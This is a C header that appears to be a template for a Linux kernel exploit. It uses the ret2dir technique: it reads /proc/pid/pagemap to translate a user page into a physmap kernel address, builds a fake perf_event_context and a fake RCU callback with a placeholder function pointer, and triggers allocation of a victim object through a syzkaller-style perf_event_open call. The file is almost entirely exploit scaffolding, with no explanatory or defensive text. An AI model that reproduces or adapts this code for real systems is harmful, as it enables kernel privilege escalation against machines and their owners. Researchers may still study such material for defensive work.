#ifndef _PID_NAMESPACE_TMPL_H_
#define _PID_NAMESPACE_TMPL_H_

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>

#define RCU_OBJ

// for ret2dir
#define PHYS_OFFSET 0xffff880000000000
#define PFN_MIN 0
#define PAGE_SIZE 0x1000
#define USER_ADDR 0x40000000
#define PAGE_SHIFT 12

struct perf_event_context {
    char hole1[0xd0];
	void* callback_next;
    char hole2[0x8];
};

struct callback_head {
	void* callback_next;
	void* callback_func;
};

struct perf_event_context fake_perf_event_context;
struct callback_head fake_callback_head;

unsigned overwrite_start = 0xd0;
unsigned overwrite_end = 0xd8;

void* victim_obj = (void*)&fake_perf_event_context;

int fd[64];
uint64_t kaddr = 0;

void do_setup_physmap() {
    void* uaddr = (void*)USER_ADDR;
    void* raddr = NULL;
    void* ret = NULL;
    char file_name[30];
    sprintf(file_name, "/proc/%d/pagemap", getpid());
    int fd = open(file_name, O_RDONLY);
    if (fd < 0) {
        perror("open failed");
		goto err;
    }
    uint64_t v = 0;
    uint64_t pfn = 0;

    munmap(uaddr, PAGE_SIZE);
    raddr = mmap(uaddr, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if(raddr == MAP_FAILED) {
        perror("mmap failed");
        goto err;
    }
    // necessary due to lazy allocation
    memset(raddr, 0, PAGE_SIZE);
    lseek(fd, ((uint64_t)uaddr >> PAGE_SHIFT)*sizeof(uint64_t), SEEK_SET);
    read(fd, &v, sizeof(uint64_t));
    if (v & (1UL << 63)) {
        pfn = v & ((1UL << 55) - 1);
        fprintf(stdout, "pfn: 0x%lx\n", pfn);
        kaddr = PHYS_OFFSET + 0x1000 * (pfn-PFN_MIN);
        fprintf(stdout, "kaddr: 0x%lx\n", kaddr);
        ret = (void*)kaddr;
		memset(&fake_perf_event_context, 0x00, sizeof(struct perf_event_context));
		fake_perf_event_context.callback_next= (void*)kaddr;
		fake_callback_head.callback_next = 0;
		fake_callback_head.callback_func = (void*)0xffffffffdeadbeef;
		memset((void*)USER_ADDR, 0xff, PAGE_SIZE);
		memcpy((void*)USER_ADDR, &fake_callback_head, sizeof(struct callback_head));
    }
	return;
err:
	close(fd);
	exit(-1);
}

#define BITMASK_LEN(type, bf_len) (type)((1ull << (bf_len)) - 1)

#define BITMASK_LEN_OFF(type, bf_off, bf_len)                                  \
  (type)(BITMASK_LEN(type, (bf_len)) << (bf_off))

#define STORE_BY_BITMASK(type, addr, val, bf_off, bf_len)                      \
  if ((bf_off) == 0 && (bf_len) == 0) {                                        \
    *(type*)(addr) = (type)(val);                                              \
  } else {                                                                     \
    type new_val = *(type*)(addr);                                             \
    new_val &= ~BITMASK_LEN_OFF(type, (bf_off), (bf_len));                     \
    new_val |= ((type)(val)&BITMASK_LEN(type, (bf_len))) << (bf_off);          \
    *(type*)(addr) = new_val;                                                  \
  }

void do_alloc_victim() {
	  syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);

  *(uint32_t*)0x20000180 = 6;
  *(uint32_t*)0x20000184 = 0x70;
  *(uint8_t*)0x20000188 = 0;
  *(uint8_t*)0x20000189 = 0;
  *(uint8_t*)0x2000018a = 0;
  *(uint8_t*)0x2000018b = 0;
  *(uint32_t*)0x2000018c = 0;
  *(uint64_t*)0x20000190 = 0;
  *(uint64_t*)0x20000198 = 0;
  *(uint64_t*)0x200001a0 = 0;
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 0, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 1, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 2, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 3, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 4, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 5, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 6, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 7, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 8, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 9, 9, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 10, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 11, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 12, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0x7fffffff, 13, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 14, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 15, 2);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 17, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 18, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 19, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 20, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 21, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 22, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 23, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 24, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 25, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 26, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0x6a53, 27, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0x38404ac1, 28, 1);
  STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 29, 35);
  *(uint32_t*)0x200001b0 = 0x100;
  *(uint32_t*)0x200001b4 = 2;
  *(uint64_t*)0x200001b8 = 0;
  *(uint64_t*)0x200001c0 = 0xa42d;
  *(uint64_t*)0x200001c8 = 0x120;
  *(uint64_t*)0x200001d0 = 1;
  *(uint32_t*)0x200001d8 = 7;
  *(uint32_t*)0x200001dc = 5;
  *(uint64_t*)0x200001e0 = 2;
  *(uint32_t*)0x200001e8 = 9;
  *(uint16_t*)0x200001ec = -1;
  *(uint16_t*)0x200001ee = 0;
  syscall(__NR_perf_event_open, 0x20000180, 0, 0, -1, 1);
	return ;
}

void do_hijack() {
 	syscall(__NR_exit, 0x0);
	return ;
}

#endif
